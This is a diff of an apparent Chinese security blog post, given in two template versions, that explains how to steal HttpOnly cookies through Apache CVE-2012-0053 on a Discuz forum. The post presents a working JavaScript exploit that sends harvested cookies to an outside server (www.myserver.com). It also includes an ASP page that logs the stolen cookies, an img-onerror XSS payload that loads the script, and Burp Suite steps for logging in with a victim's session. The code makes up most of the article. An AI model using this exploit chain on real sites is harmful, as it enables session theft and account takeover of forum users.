@@ -1,149 +1,446 @@
-<!DOCTYPE html>
-<html>
 
+ <!DOCTYPE HTML>
+<html  xmlns:wb="http://open.weibo.com/wb">
 <head>
-  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
-  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-  <title>http-only型cookie截取及利用 | Blog of Secer</title>
-  <meta name="description" content="" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="MobileOptimized" content="320" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
-  <link rel="stylesheet" type="text/css" href="/css/style.css" />
-  <meta name="generator" content="Blog of Secer">
-
+  <meta charset="UTF-8">
   
-  
-  
-
-  
+    <title>http-only型cookie截取及利用 | Blog of Secer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="Secer">
+    
+    <meta name="description" content="Apache服务器2.2.0-2.2.21版本存在一个漏洞（CVE-2012-0053），攻击者可通过给网站植入超大的Cookie，使得HTTP头超过apache的LimitRequestFieldSize（最大请求长度）8192字节，apache便会返回400错误，状态页中就包含了http-only保护的cookies。  &amp;#160;  httpOnly型cookie截取及利用(Apache CVE：2112-0053)  漏洞名称：APACHE Httponly Cookie Disclosure（CVE：2112-0053）    测试目标环境：Windows xp sp3、discuz x2.5、apache2.2.17（漏洞存在的版本）">
+    
+    
+    
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="333" />
+    <meta name="twitter:title" content="http-only型cookie截取及利用 | Blog of Secer" />
+      
+    
+    
+    <link rel="alternate" href="atom.xml" title="Blog of Secer" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/pacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/pacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
 </head>
 
-<!--
-<body class="post-template">
--->
-<body class="home-template">
-<div id="perspective" class="perspective effect-movedown">
-  <div class="container">
-    <!-- wrapper -->
-    <div class="wrapper">
+  <body>
+    <header>
+      <div>
+		
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Blog of Secer">Blog of Secer</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">首页</a></li>
+					
+						<li><a href="/archives">文章</a></li>
+					
+						<li><a href="/about">关于</a></li>
+					
+						<li><a href="/atom.xml">RSS订阅</a></li>
+					
+					<li>
+					
+					<form class="search" action="/search/index.html" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="30" placeholder="Search" />
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
 
-      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
-    <div class="vertical">
-        <div class="site-head-content inner">
-             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
-            <h1 class="blog-title">Blog of Secer</h1>
-            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
-        </div>
-    </div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/1044.seo/" title="http-only型cookie截取及利用" itemprop="url">http-only型cookie截取及利用</a>
+  </h1>
+  <!-- 显示作者
+  <p class="article-author">By
+    
+      <a href="http://ha.cker.in" title="Secer">Secer</a>
+    </p>
+  -->  
+  <p class="article-time">
+    <time datetime="2013-10-21T23:57:30.000Z" itemprop="datePublished">2013-10-22</time>
+    Updated:<time datetime="2016-08-20T11:03:54.000Z" itemprop="dateModified">2016-08-20</time>
+    
+  </p>
 </header>
 
-      
+	<div class="article-content">
+		
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		
+		</div>
+		
+		<p><a href="http://Ha.Cker.In/tag/Apache" target="_blank">Apache</a>服务器2.2.0-2.2.21版本存在一个漏洞（CVE-2012-0053），攻击者可通过给网站植入超大的Cookie，使得HTTP头超过apache的LimitRequestFieldSize（最大请求长度）8192字节，apache便会返回400错误，状态页中就包含了http-only保护的cookies。</p>  <p><a href="http://img.cker.in/httponlycookie_E01C/image.png" target="_blank" rel="external"><img title="image" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="580" alt="image" src="http://img.cker.in/httponlycookie_E01C/image_thumb.png" width="701" border="0"></a>&#160;</p>  <p><a href="http://Ha.Cker.In/tag/httpOnly" target="_blank">httpOnly</a>型cookie截取及利用(Apache CVE：2112-0053)</p>  <p>漏洞名称：<a href="http://Ha.Cker.In/tag/Apache" target="_blank">APACHE</a> <a href="http://Ha.Cker.In/tag/httpOnly" target="_blank">Httponly</a> Cookie Disclosure（CVE：2112-0053）    <br>测试目标环境：Windows xp sp3、discuz x2.5、apache2.2.17（漏洞存在的版本）</p><br><a id="more"></a><br><p>我们来构造我们的exploit，让apache触发此漏洞，然后就能获取到httponly的cookie了。Exploit利用代码在上面的链 接中有给出，直接复制到js文件中，然后加载会弹出完整的cookie，我们这里把他修改一下，不用弹框，我们要获取到这个完整的cookie，并存到我 们的后台。   <br>Exploit如下，也就是我们要加载的js文件，我们命名为cookie.js：    <table cellspacing="0" cellpadding="0" border="0"><tbody>       <tr>         <td>           <p>// Most browsers limit cookies to 4k characters, so we need multiple</p>            <p>function setCookies (good) {</p>            <p>// Construct string for cookie value</p>            <p>var str = &quot;&quot;;</p>            <p>for (var i=0; i&lt; 819; i++) {</p>            <p>str += &quot;x&quot;;</p>            <p>}</p>            <p>// Set cookies</p>            <p>for (i = 0; i &lt; 10; i++) {</p>            <p>// Expire evil cookie</p>            <p>if (good) {</p>            <p>var cookie = &quot;xss&quot;+i+&quot;=;expires=&quot;+new Date(+new Date()-1).toUTCString()+&quot;; path=/;&quot;;</p>            <p>}</p>            <p>// Set evil cookie</p>            <p>else {</p>            <p>var cookie = &quot;xss&quot;+i+&quot;=&quot;+str+&quot;;path=/&quot;;</p>            <p>}</p>            <p>document.cookie = cookie;</p>            <p>}</p>            <p>}</p>            <p>function makeRequest() {</p>            <p>setCookies();</p>            <p>function parseCookies () {</p>            <p>var cookie_dict = {};</p>            <p>// Only react on 400 status</p>            <p>if (xhr.readyState === 4 &amp;&amp; xhr.status === 400) {</p>            <p>// Replace newlines and match &lt;pre&gt; content</p>            <p>var content = xhr.responseText.replace(/\r|\n/g,’’).match(/&lt;pre&gt;(.+)&lt;\/pre&gt;/);</p>            <p>if (content.length) {</p>            <p>// Remove Cookie: prefix</p>            <p>content = content[1].replace(&quot;Cookie: &quot;, &quot;&quot;);</p>            <p>var cookies = content.replace(/xss\d=x+;?/g, ‘’).split(/;/g);</p>            <p>// Add cookies to object</p>            <p>for (var i=0; i&lt;cookies.length; i++) {</p>            <p>var s_c = cookies[i].split(‘=’,2);</p>            <p>cookie_dict[s_c[0]] = s_c[1];</p>            <p>}</p>            <p>}</p>            <p>// Unset malicious cookies</p>            <p>setCookies(true);</p>            <p>var x=new Image();</p>            <p>try</p>            <p>{</p>            <p>var myopener=’’; </p>            <p>myopener=window.opener &amp;&amp; window.opener.location?window.opener.location:’’; </p>            <p>}</p>            <p>catch(err)</p>            <p>{</p>            <p>}</p>            <p>x.src=’<a href="http://www.myserver.com/cookie.asp?msg=&#39;+JSON.stringify(cookie_dict" target="_blank" rel="external">http://www.myserver.com/cookie.asp?msg=&#39;+JSON.stringify(cookie_dict</a>); </p>            <p>//这里是你接受cookie的服务器地址</p>            <p>//alert(JSON.stringify(cookie_dict));</p>            <p>}</p>            <p>}</p>            <p>// Make XHR request</p>            <p>var xhr = new XMLHttpRequest();</p>            <p>xhr.onreadystatechange = parseCookies;</p>            <p>xhr.open(&quot;GET&quot;, &quot;/&quot;, true);</p>            <p>xhr.send(null);</p>            <p>}</p>            <p>makeRequest();</p>         </td>       </tr>     </tbody></table> </p>  <p>下面是我们接受cookie的页面代码，这里写的很简单：   <br>我们命名为cookie.asp，就是上面cookie.js中的接受cookie的页面文件：    <table cellspacing="0" cellpadding="0" border="0"><tbody>       <tr>         <td>           <p>&lt;html&gt;</p>            <p>&lt;title&gt;==GET COOKIE==&lt;/title&gt;</p>            <p>&lt;body&gt;</p>            <p>&lt;%testfile = Server.MapPath(&quot;code.txt&quot;) //先构造一个路径，也就是取网站根目录，创造一个在根目录下的code.txt路径，保存在testfile中</p>            <p>msg = Request(&quot;msg&quot;) //获取提交过来的msg变量，也就是cookie值</p>            <p>set fs = server.CreateObject(&quot;scripting.filesystemobject&quot;)//创建一个fs对象</p>            <p>set thisfile = fs.OpenTextFile(testfile,8,True,0)</p>            <p>thisfile.WriteLine(&quot;&quot;&amp;msg&amp;&quot;&quot;)//像code.txt中写入获取来的cookie</p>            <p>thisfile.close() //关闭</p>            <p>set fs = nothing%&gt;</p>            <p>&lt;/body&gt;</p>            <p>&lt;/html&gt;</p>         </td>       </tr>     </tbody></table> </p>  <p>我们把要加载的cookie.js文件和获取cookie的cookie.asp文件一起放到我们的服务器根目录下。   <br>然后我们开始加载我们的js文件，早附件的描述信息中填写以下code：    <table cellspacing="0" cellpadding="0" border="0"><tbody>       <tr>         <td>           <p>&amp;lt;img/src=x/onerror=s=createElement(‘script’);body.appendChild(s);s.src=’<a href="http://www.myserver.com/cookie.js&#39;;&amp;gt" target="_blank" rel="external">http://www.myserver.com/cookie.js&#39;;&amp;gt</a>;</p>         </td>       </tr>     </tbody></table> </p>  <p>这里一定要注意这里填入code的长度，这个完整不完整我们可以再发文帖子后把鼠标放到图片上看描述信息是否是我们填写的code是否完整。   <br>双击图片，看看是否加载了我们的js：</p>  <p><a href="http://img.cker.in/httponlycookie_E01C/clip_image001.jpg" target="_blank" rel="external"><img title="clip_image001" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="176" alt="clip_image001" src="http://img.cker.in/httponlycookie_E01C/clip_image001_thumb.jpg" width="782" border="0"></a></p>  <p>下面看看保存在code.txt中我们获取到的完整的cookie信息：   <br><a href="http://img.cker.in/httponlycookie_E01C/clip_image002.jpg" target="_blank" rel="external"><img title="clip_image002" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="123" alt="clip_image002" src="http://img.cker.in/httponlycookie_E01C/clip_image002_thumb.jpg" width="821" border="0"></a></p>  <p>可以看到现在有那两个httponly的字段值了。   <br>这里的cookie内容是json格式的，我们转换成正确的内容格式：</p>  <p><a href="http://img.cker.in/httponlycookie_E01C/clip_image003.jpg" target="_blank" rel="external"><img title="clip_image003" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="134" alt="clip_image003" src="http://img.cker.in/httponlycookie_E01C/clip_image003_thumb.jpg" width="820" border="0"></a></p>  <p>然后用这个cookie就能成功利用登陆了，至于怎么登陆，方法很多了，我最爱brup suite啦！   <br>正好前面有盆友在问，我就拿这个神器来替换cookie登陆吧：    <br><a href="http://img.cker.in/httponlycookie_E01C/clip_image004.jpg" target="_blank" rel="external"><img title="clip_image004" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="453" alt="clip_image004" src="http://img.cker.in/httponlycookie_E01C/clip_image004_thumb.jpg" width="768" border="0"></a>    <br>1、打开神器brup suite，到proxy选项的options选项    <br>2、然后到match and replace 模块，选中下面的cookie一项（没有的话就自己添加一个）    <br>3、然后edit编辑cookie    <br>4、再到下面的输入框中填入我们的cookie，然后update就好了。    <br>5、最后设置好代理，刷一下目标站，然后就登陆成功了    <br>最后看看登陆结果吧：</p>  <p><a href="http://img.cker.in/httponlycookie_E01C/clip_image005.jpg" target="_blank" rel="external"><img title="clip_image005" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="168" alt="clip_image005" src="http://img.cker.in/httponlycookie_E01C/clip_image005_thumb.jpg" width="560" border="0"></a></p>  <p>参考链接：</p>  <p><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0053" target="_blank" rel="external">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0053</a> <a href="http://www.youtube.com/watch?v=Hrt32bPuxBA" target="_blank" rel="external">http://www.youtube.com/watch?v=Hrt32bPuxBA</a>    <br><a href="http://www.exploit-db.com/exploits/18442/" target="_blank" rel="external">http://www.exploit-db.com/exploits/18442/</a>    <br><a href="http://www.exploit-db.com/exploits/18442/http://drops.wooyun.org/papers/501" target="_blank" rel="external">http://drops.wooyun.org/papers/501</a></p>  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-share" id="share">
 
-<main class="content" role="main">
-  <article class="post">
-    <span class="post-meta">
-      <time datetime="2013-10-21T23:57:30.000Z" itemprop="datePublished">
-          2013-10-22
-      </time>
-    
-    
-    | 
-    <a href='/tag/Apache/'>Apache</a>
-    
-    
-</span>
-    <h1 class="post-title">http-only型cookie截取及利用</h1>
-    <section class="post-content">
-      <p><a href="http://Ha.Cker.In/tag/Apache" target="_blank">Apache</a>服务器2.2.0-2.2.21版本存在一个漏洞（CVE-2012-0053），攻击者可通过给网站植入超大的Cookie，使得HTTP头超过apache的LimitRequestFieldSize（最大请求长度）8192字节，apache便会返回400错误，状态页中就包含了http-only保护的cookies。</p>  <p><a href="http://img.cker.in/httponlycookie_E01C/image.png" target="_blank" rel="external"><img title="image" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="580" alt="image" src="http://img.cker.in/httponlycookie_E01C/image_thumb.png" width="701" border="0"></a>&#160;</p>  <p><a href="http://Ha.Cker.In/tag/httpOnly" target="_blank">httpOnly</a>型cookie截取及利用(Apache CVE：2112-0053)</p>  <p>漏洞名称：<a href="http://Ha.Cker.In/tag/Apache" target="_blank">APACHE</a> <a href="http://Ha.Cker.In/tag/httpOnly" target="_blank">Httponly</a> Cookie Disclosure（CVE：2112-0053）    <br>测试目标环境：Windows xp sp3、discuz x2.5、apache2.2.17（漏洞存在的版本）</p><br><a id="more"></a><br><p>我们来构造我们的exploit，让apache触发此漏洞，然后就能获取到httponly的cookie了。Exploit利用代码在上面的链 接中有给出，直接复制到js文件中，然后加载会弹出完整的cookie，我们这里把他修改一下，不用弹框，我们要获取到这个完整的cookie，并存到我 们的后台。   <br>Exploit如下，也就是我们要加载的js文件，我们命名为cookie.js：    <table cellspacing="0" cellpadding="0" border="0"><tbody>       <tr>         <td>           <p>// Most browsers limit cookies to 4k characters, so we need multiple</p>            <p>function setCookies (good) {</p>            <p>// Construct string for cookie value</p>            <p>var str = &quot;&quot;;</p>            <p>for (var i=0; i&lt; 819; i++) {</p>            <p>str += &quot;x&quot;;</p>            <p>}</p>            <p>// Set cookies</p>            <p>for (i = 0; i &lt; 10; i++) {</p>            <p>// Expire evil cookie</p>            <p>if (good) {</p>            <p>var cookie = &quot;xss&quot;+i+&quot;=;expires=&quot;+new Date(+new Date()-1).toUTCString()+&quot;; path=/;&quot;;</p>            <p>}</p>            <p>// Set evil cookie</p>            <p>else {</p>            <p>var cookie = &quot;xss&quot;+i+&quot;=&quot;+str+&quot;;path=/&quot;;</p>            <p>}</p>            <p>document.cookie = cookie;</p>            <p>}</p>            <p>}</p>            <p>function makeRequest() {</p>            <p>setCookies();</p>            <p>function parseCookies () {</p>            <p>var cookie_dict = {};</p>            <p>// Only react on 400 status</p>            <p>if (xhr.readyState === 4 &amp;&amp; xhr.status === 400) {</p>            <p>// Replace newlines and match &lt;pre&gt; content</p>            <p>var content = xhr.responseText.replace(/\r|\n/g,’’).match(/&lt;pre&gt;(.+)&lt;\/pre&gt;/);</p>            <p>if (content.length) {</p>            <p>// Remove Cookie: prefix</p>            <p>content = content[1].replace(&quot;Cookie: &quot;, &quot;&quot;);</p>            <p>var cookies = content.replace(/xss\d=x+;?/g, ‘’).split(/;/g);</p>            <p>// Add cookies to object</p>            <p>for (var i=0; i&lt;cookies.length; i++) {</p>            <p>var s_c = cookies[i].split(‘=’,2);</p>            <p>cookie_dict[s_c[0]] = s_c[1];</p>            <p>}</p>            <p>}</p>            <p>// Unset malicious cookies</p>            <p>setCookies(true);</p>            <p>var x=new Image();</p>            <p>try</p>            <p>{</p>            <p>var myopener=’’; </p>            <p>myopener=window.opener &amp;&amp; window.opener.location?window.opener.location:’’; </p>            <p>}</p>            <p>catch(err)</p>            <p>{</p>            <p>}</p>            <p>x.src=’<a href="http://www.myserver.com/cookie.asp?msg=&#39;+JSON.stringify(cookie_dict" target="_blank" rel="external">http://www.myserver.com/cookie.asp?msg=&#39;+JSON.stringify(cookie_dict</a>); </p>            <p>//这里是你接受cookie的服务器地址</p>            <p>//alert(JSON.stringify(cookie_dict));</p>            <p>}</p>            <p>}</p>            <p>// Make XHR request</p>            <p>var xhr = new XMLHttpRequest();</p>            <p>xhr.onreadystatechange = parseCookies;</p>            <p>xhr.open(&quot;GET&quot;, &quot;/&quot;, true);</p>            <p>xhr.send(null);</p>            <p>}</p>            <p>makeRequest();</p>         </td>       </tr>     </tbody></table> </p>  <p>下面是我们接受cookie的页面代码，这里写的很简单：   <br>我们命名为cookie.asp，就是上面cookie.js中的接受cookie的页面文件：    <table cellspacing="0" cellpadding="0" border="0"><tbody>       <tr>         <td>           <p>&lt;html&gt;</p>            <p>&lt;title&gt;==GET COOKIE==&lt;/title&gt;</p>            <p>&lt;body&gt;</p>            <p>&lt;%testfile = Server.MapPath(&quot;code.txt&quot;) //先构造一个路径，也就是取网站根目录，创造一个在根目录下的code.txt路径，保存在testfile中</p>            <p>msg = Request(&quot;msg&quot;) //获取提交过来的msg变量，也就是cookie值</p>            <p>set fs = server.CreateObject(&quot;scripting.filesystemobject&quot;)//创建一个fs对象</p>            <p>set thisfile = fs.OpenTextFile(testfile,8,True,0)</p>            <p>thisfile.WriteLine(&quot;&quot;&amp;msg&amp;&quot;&quot;)//像code.txt中写入获取来的cookie</p>            <p>thisfile.close() //关闭</p>            <p>set fs = nothing%&gt;</p>            <p>&lt;/body&gt;</p>            <p>&lt;/html&gt;</p>         </td>       </tr>     </tbody></table> </p>  <p>我们把要加载的cookie.js文件和获取cookie的cookie.asp文件一起放到我们的服务器根目录下。   <br>然后我们开始加载我们的js文件，早附件的描述信息中填写以下code：    <table cellspacing="0" cellpadding="0" border="0"><tbody>       <tr>         <td>           <p>&amp;lt;img/src=x/onerror=s=createElement(‘script’);body.appendChild(s);s.src=’<a href="http://www.myserver.com/cookie.js&#39;;&amp;gt" target="_blank" rel="external">http://www.myserver.com/cookie.js&#39;;&amp;gt</a>;</p>         </td>       </tr>     </tbody></table> </p>  <p>这里一定要注意这里填入code的长度，这个完整不完整我们可以再发文帖子后把鼠标放到图片上看描述信息是否是我们填写的code是否完整。   <br>双击图片，看看是否加载了我们的js：</p>  <p><a href="http://img.cker.in/httponlycookie_E01C/clip_image001.jpg" target="_blank" rel="external"><img title="clip_image001" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="176" alt="clip_image001" src="http://img.cker.in/httponlycookie_E01C/clip_image001_thumb.jpg" width="782" border="0"></a></p>  <p>下面看看保存在code.txt中我们获取到的完整的cookie信息：   <br><a href="http://img.cker.in/httponlycookie_E01C/clip_image002.jpg" target="_blank" rel="external"><img title="clip_image002" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="123" alt="clip_image002" src="http://img.cker.in/httponlycookie_E01C/clip_image002_thumb.jpg" width="821" border="0"></a></p>  <p>可以看到现在有那两个httponly的字段值了。   <br>这里的cookie内容是json格式的，我们转换成正确的内容格式：</p>  <p><a href="http://img.cker.in/httponlycookie_E01C/clip_image003.jpg" target="_blank" rel="external"><img title="clip_image003" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="134" alt="clip_image003" src="http://img.cker.in/httponlycookie_E01C/clip_image003_thumb.jpg" width="820" border="0"></a></p>  <p>然后用这个cookie就能成功利用登陆了，至于怎么登陆，方法很多了，我最爱brup suite啦！   <br>正好前面有盆友在问，我就拿这个神器来替换cookie登陆吧：    <br><a href="http://img.cker.in/httponlycookie_E01C/clip_image004.jpg" target="_blank" rel="external"><img title="clip_image004" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="453" alt="clip_image004" src="http://img.cker.in/httponlycookie_E01C/clip_image004_thumb.jpg" width="768" border="0"></a>    <br>1、打开神器brup suite，到proxy选项的options选项    <br>2、然后到match and replace 模块，选中下面的cookie一项（没有的话就自己添加一个）    <br>3、然后edit编辑cookie    <br>4、再到下面的输入框中填入我们的cookie，然后update就好了。    <br>5、最后设置好代理，刷一下目标站，然后就登陆成功了    <br>最后看看登陆结果吧：</p>  <p><a href="http://img.cker.in/httponlycookie_E01C/clip_image005.jpg" target="_blank" rel="external"><img title="clip_image005" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="168" alt="clip_image005" src="http://img.cker.in/httponlycookie_E01C/clip_image005_thumb.jpg" width="560" border="0"></a></p>  <p>参考链接：</p>  <p><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0053" target="_blank" rel="external">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0053</a> <a href="http://www.youtube.com/watch?v=Hrt32bPuxBA" target="_blank" rel="external">http://www.youtube.com/watch?v=Hrt32bPuxBA</a>    <br><a href="http://www.exploit-db.com/exploits/18442/" target="_blank" rel="external">http://www.exploit-db.com/exploits/18442/</a>    <br><a href="http://www.exploit-db.com/exploits/18442/http://drops.wooyun.org/papers/501" target="_blank" rel="external">http://drops.wooyun.org/papers/501</a></p>
-    </section>
-    <footer class="post-footer">
-      <section class="author">
-    <h4>Secer</h4>
-    <p>记录互联网安全历程与个人成长经历</p>
-</section>
-      <section class="share">
-    <h4>Share this post</h4>
-    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/1044.seo/" target="_blank">
-        <span class="hidden">weibo</span>
-    </a>
-    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/1044.seo/"
-       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
-        <span class="hidden">Twitter</span>
-    </a>
-    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/1044.seo/"
-       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
-        <span class="hidden">Facebook</span>
-    </a>
-    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/1044.seo/"
-       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
-        <span class="hidden">Google+</span>
-    </a>
-</section>
-
-    </footer>
-  </article>
-  <nav class="pagination" role="pagination">
-    
-    <a class="newer-posts" href="/1045.seo/">
-        ← ali
-    </a>
-    
-    <span class="icon-logo">•</span>
-    
-    <a class="older-posts" href="/1043.seo/">
-        攻击JavaWeb应用 8 -后门篇 →
-    </a>
-    
-</nav>
-
-  <div id="comment" class="comments-area">
-    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
-    
-</div>
-
-</main>
-
-
-      
-<footer class="site-footer">
   
-  <div class="inner">
-     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
-     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
-  </div>
-</footer>
+<!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+    <span class="jiathis_txt">分享到：</span>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_weixin"></a>
+    <a class="jiathis_button_renren"></a>
+    <a href="http://www.jiathis.com/share?uid=1987046" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+    <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript">
+var jiathis_config = {data_track_clickback:'true'};
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1987046" charset="utf-8"></script>
+<!-- JiaThis Button END -->
 
-      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-
-<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
-<script type="text/javascript" src="/js/index.js"></script>
-<script type="text/javascript" src="/js/menu.js"></script>
 
 
-
-
-
-  </div>
 </div>
 
-<nav  class="outer-nav top horizontal">
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/category/Web安全/">Web安全</a>
+</div>
 
-          <a class="icon-home"  href="/"><span>Home</span></a>
 
-          <a class="icon-news"  href="/archives"><span>Archive</span></a>
+  <div class="article-tags">
+  
+  <span></span> <a href="/tag/Apache/">Apache</a>
+  </div>
 
-          <a class="icon-image"  href="/images"><span>Images</span></a>
 
-          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
+</footer>   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/1045.seo/" title="ali">
+  <strong>Prev:</strong><br/>
+  <span>
+  ali</span>
+</a>
+</div>
 
-          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
 
-          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
+<div class="next">
+<a href="/1043.seo/"  title="攻击JavaWeb应用 8 -后门篇">
+ <strong>Next:</strong><br/> 
+ <span>攻击JavaWeb应用 8 -后门篇
+</span>
+</a>
+</div>
 
 </nav>
 
+	<!-- 多说-->
+
+<section class="comment">
+<div class="ds-thread" data-thread-key="post-http-only型cookie截取及利用" data-title="http-only型cookie截取及利用" data-url="http://ha.cker.in/1044.seo/"></div>
+</section>
+<!-- disqus-->
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  <p class="asidetitle">关注</p>
+<iframe width="100%" height="120" class="share_self" marginheight="5px" frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=120&fansRow=2&ptype=1&speed=0&skin=1&isTitle=1&noborder=1&isWeibo=1&isFans=1&uid=2583230784&verifier=1d07a1a0&dpc=1"></iframe>
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+			<li><a href="/category/Linux笔记/" title="Linux笔记">Linux笔记<sup>46</sup></a></li>
+		
+			<li><a href="/category/Web安全/" title="Web安全">Web安全<sup>88</sup></a></li>
+		
+			<li><a href="/category/代码学习/" title="代码学习">代码学习<sup>25</sup></a></li>
+		
+			<li><a href="/category/原创文章/" title="原创文章">原创文章<sup>37</sup></a></li>
+		
+			<li><a href="/category/工具视频/" title="工具视频">工具视频<sup>12</sup></a></li>
+		
+			<li><a href="/category/影音娱乐/" title="影音娱乐">影音娱乐<sup>15</sup></a></li>
+		
+			<li><a href="/category/手机安全/" title="手机安全">手机安全<sup>11</sup></a></li>
+		
+			<li><a href="/category/无线安全/" title="无线安全">无线安全<sup>4</sup></a></li>
+		
+			<li><a href="/category/渗透测试/" title="渗透测试">渗透测试<sup>94</sup></a></li>
+		
+			<li><a href="/category/疑难杂症/" title="疑难杂症">疑难杂症<sup>11</sup></a></li>
+		
+			<li><a href="/category/精品软件/" title="精品软件">精品软件<sup>16</sup></a></li>
+		
+			<li><a href="/category/絮叨碎语/" title="絮叨碎语">絮叨碎语<sup>47</sup></a></li>
+		
+			<li><a href="/category/黑客技巧/" title="黑客技巧">黑客技巧<sup>77</sup></a></li>
+		
+		</ul>
 </div>
-</body>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			<li><a href="/tag/net/" title=".net">.net<sup>1</sup></a></li>
+		
+			<li><a href="/tag/0day/" title="0day">0day<sup>5</sup></a></li>
+		
+			<li><a href="/tag/12306/" title="12306">12306<sup>3</sup></a></li>
+		
+			<li><a href="/tag/12306刷票外挂/" title="12306刷票外挂">12306刷票外挂<sup>1</sup></a></li>
+		
+			<li><a href="/tag/12306刷票外挂下载/" title="12306刷票外挂下载">12306刷票外挂下载<sup>1</sup></a></li>
+		
+			<li><a href="/tag/1521/" title="1521">1521<sup>1</sup></a></li>
+		
+			<li><a href="/tag/3389/" title="3389">3389<sup>1</sup></a></li>
+		
+			<li><a href="/tag/360/" title="360">360<sup>1</sup></a></li>
+		
+			<li><a href="/tag/3600safe/" title="3600safe">3600safe<sup>1</sup></a></li>
+		
+			<li><a href="/tag/360浏览器抢票专版/" title="360浏览器抢票专版">360浏览器抢票专版<sup>1</sup></a></li>
+		
+			<li><a href="/tag/61398/" title="61398">61398<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ACL/" title="ACL">ACL<sup>1</sup></a></li>
+		
+			<li><a href="/tag/APT/" title="APT">APT<sup>3</sup></a></li>
+		
+			<li><a href="/tag/ARP/" title="ARP">ARP<sup>2</sup></a></li>
+		
+			<li><a href="/tag/ASP/" title="ASP">ASP<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ASP中FSO的神奇功能/" title="ASP中FSO的神奇功能">ASP中FSO的神奇功能<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ATM/" title="ATM">ATM<sup>1</sup></a></li>
+		
